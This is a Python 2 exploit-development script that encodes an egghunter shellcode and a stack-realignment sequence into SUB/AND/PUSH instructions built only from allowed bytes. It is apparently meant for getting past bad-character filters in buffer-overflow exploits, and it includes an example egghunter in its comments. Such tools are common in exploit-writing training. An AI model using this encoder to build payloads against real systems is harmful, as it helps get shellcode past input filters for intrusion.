#!/usr/bin/env python
import sys
import itertools

# This tool automates the painstaking process of encoding an egghunter when you have a list of good characters
# Example run: ./subfactor.py -h "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" "\x10\x35\xFF\xEC"
# Just copy and paste the egghunter directly into the line above after the h (!mona egghunter -t w00t)
# Look in Immunity and find 1. Address in ESP (before our pushes/pops) 2. The address we want the end of the egghunter to end up. The input to the program is 2.-1. in hex.
# The egghunter will decode backwards, so make sure you have enough room for it
# If it generates too big of a payload, or it gets stuck in a loop then you need to play with the good_hex array and get rid of the larger hex values until it works
# Paste the 2 outputs in sequence one after the other
# If you want to see the assembly use -a instead of -h

#good_hex = [0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0b,0x0c,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2a,0x2b,0x2c,0x2d,0x2e,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3b,0x3c,0x3d,0x3e,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6c,0x6d,0x6e,0x6f,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,0x7b,0x7c,0x7d,0x7e,0x7f]
good_hex = [0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3b,0x3c,0x3d,0x3e,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6c,0x6d,0x6e,0x6f,0x21,0x24,0x25,0x2a,0x2d]
complimentary_value1 = 0x554E4D4A #two values that are acceptable to the good_hex that when anded together are 0
complimentary_value2 = 0x2A313235

def input_handler():
    if len(sys.argv) is not 4:
        print("Usage: python subfactor.py [-a|-h] <32 byte egghunter in hex> <Address difference (Address where we want to end up - Address in ESP)>")
        print("Note: You need to edit the 'good_hex' array in this file to match the valid hex characters for your program!")
        sys.exit(0)


    #print sys.argv[1]
    try:
        printType = "a" if (sys.argv[1] == "-a") else "h"
        address = sys.argv[3]
        address = address.replace("\\x","")
        address = "0x" + address
        hex_buffer = sys.argv[2]
        hex_buffer = hex_buffer.replace("x","")
        #print hex_buffer.replace("\\","")
        if len(hex_buffer.replace("\\","")) is not 64:
            raise Exception()
        hex_stack = hex_buffer.split('\\')
        del hex_stack[0]
        si = iter(hex_stack)
        hex_stack = [''.join(each) for each in itertools.izip(si, si, si, si)]
        hex_stack = ["0x" + x for x in hex_stack]
        hex_stack = list(reversed(hex_stack))
        return hex_stack,address,printType
    except:
        sys.exit("Invalid egghunter")

    sys.exit(0)

def reverse_32(x):
    return (x >> 24) & (0x000000ff) | (x >> 8)&(0x0000ff00) | (x << 8)&(0x00ff0000) | (x << 24) & (0xff000000)

def twos_compliment(x):
    return (~x & 0xffffffff) + 1

def is_all_good_hex(x, good):
    mask_8 = 0xff
    mask_32 = 0xffffffff
    byte = 8
    for byte_no in list(reversed(range(0,4))):
        if (x >> byte*byte_no)&mask_8 not in good:
            return False
    return True
# minuend - subtrahend = difference
# minuend is 4 bytes
def sub(minuend, good): # minuend - subtrahend = difference
    max_good = max(good)
    min_good = min(good)
    mask_8 = 0xff
    mask_32 = 0xffffffff
    byte = 8
    subtrahend = 0x00000000
    for byte_no in list(reversed(range(0,4))):
        if (minuend >> byte*byte_no)&mask_8 not in good:
            subtrahend = subtrahend | max_good << byte_no*byte
        else:
            subtrahend = subtrahend | min_good << byte_no*byte
    return subtrahend, (minuend - subtrahend)&mask_32

def get_esp_instructions(address, printType):
    y = twos_compliment(address)
    final_values = []
    result = []
    while not is_all_good_hex(y,good_hex):
        result = sub(y, good_hex)
        #print ""
        #print hex(y) + " - "
        #print hex(result[0])
        #print "------------"
        #print hex(result[1])
        #print ""
        y = result[1]
        final_values.append(result[0])
    final_values.append(result[1])
    if printType == "a":
        outvalue = ""
        outvalue += "AND EAX, " + hex(complimentary_value1) + "\n"
        outvalue += "AND EAX, " + hex(complimentary_value2) + "\n"
        outvalue += "PUSH ESP"
        outvalue += "POP EAX"
        for each_value in final_values:
            outvalue += "SUB EAX, " + hex(each_value) + "\n"
        outvalue += "PUSH EAX" + "\n"
        outvalue += "POP ESP"  + "\n"
    else:
        outvalue = ""
        outvalue += hex(reverse_32(complimentary_value1) | (0x25 << 8*4)).replace("0x","") # AND EAX, complimentary_value1
        outvalue += hex(reverse_32(complimentary_value2) | (0x25 << 8*4)).replace("0x","") # AND EAX, complimentary_value2
        outvalue += hex(0x54).replace("0x","") # PUSH ESP
        outvalue += hex(0x58).replace("0x","") # POP EAX
        for each_value in final_values:
            outvalue += hex(reverse_32(each_value) | (0x2D << 8*4)).replace("0x","") # SUB EAX, each_value
        outvalue += hex(0x50).replace("0x","") # PUSH EAX
        outvalue += hex(0x5C).replace("0x","") # POP ESP
        tempOut = ""
        for i in range(0,len(outvalue)):
            if not i % 2:
                tempOut += "\\x"
            tempOut += outvalue[i]
        outvalue = tempOut

    return outvalue

def encode_4_bytes(value, printType):
    y = twos_compliment(reverse_32(value))
    final_values = []
    result = []
    while not is_all_good_hex(y,good_hex):
        result = sub(y, good_hex)
        y = result[1]
        final_values.append(result[0])
    final_values.append(result[1])
    if printType == "a":
        outvalue = ""
        outvalue += "AND EAX, " + hex(complimentary_value1) + "\n"
        outvalue += "AND EAX, " + hex(complimentary_value2) + "\n"
        for each_value in final_values:
            outvalue += "SUB EAX, " + hex(each_value) + "\n"
        outvalue += "PUSH EAX" + "\n"
    else:
        outvalue = ""
        outvalue += hex(reverse_32(complimentary_value1) | (0x25 << 8*4)).replace("0x","") # AND EAX, complimentary_value1
        outvalue += hex(reverse_32(complimentary_value2) | (0x25 << 8*4)).replace("0x","") # AND EAX, complimentary_value2
        for each_value in final_values:
            outvalue += hex(reverse_32(each_value) | (0x2D << 8*4)).replace("0x","") # SUB EAX, each_value
        outvalue += hex(0x50).replace("0x","")
        tempOut = ""
        for i in range(0,len(outvalue)):
            if not i % 2:
                tempOut += "\\x"
            tempOut += outvalue[i]
        outvalue = tempOut

    return outvalue



hex_stack,address,printType = input_handler()


outvalue = ""
outvalue = get_esp_instructions(int(address,0), printType)
print ""
print "Encoded Stack Realignment - " + str(len(outvalue.replace("\\x",""))/(2*4)) + " instructions"
print "-------------------------------------"
print ""
print outvalue

outvalue = ""
for hex_val in hex_stack:
    outvalue += encode_4_bytes(int(hex_val,0),printType)

print ""
print "Encoded Egghunter - " + str(len(outvalue.replace("\\x",""))/(2*4)) + " instructions"
print "------------------------------"
print ""
print outvalue
print ""


